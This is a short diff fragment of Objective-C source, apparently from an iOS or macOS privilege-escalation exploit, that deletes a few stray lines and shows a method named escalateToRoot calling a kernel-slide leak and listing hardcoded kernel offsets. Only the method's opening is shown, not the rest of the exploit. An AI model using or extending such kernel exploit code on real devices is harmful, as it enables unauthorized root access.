@@ -111,10 +111,6 @@ extern char **environ;
     }
 }
 
-0x4000);
-    }
-}
-
 - (BOOL)escalateToRoot {
     uint64_t slide = [self leakKernelSlide];
     uint64_t offsets[] = {0x8F50000, 0x8F54000, 0x91F0000, 0x91F4000};
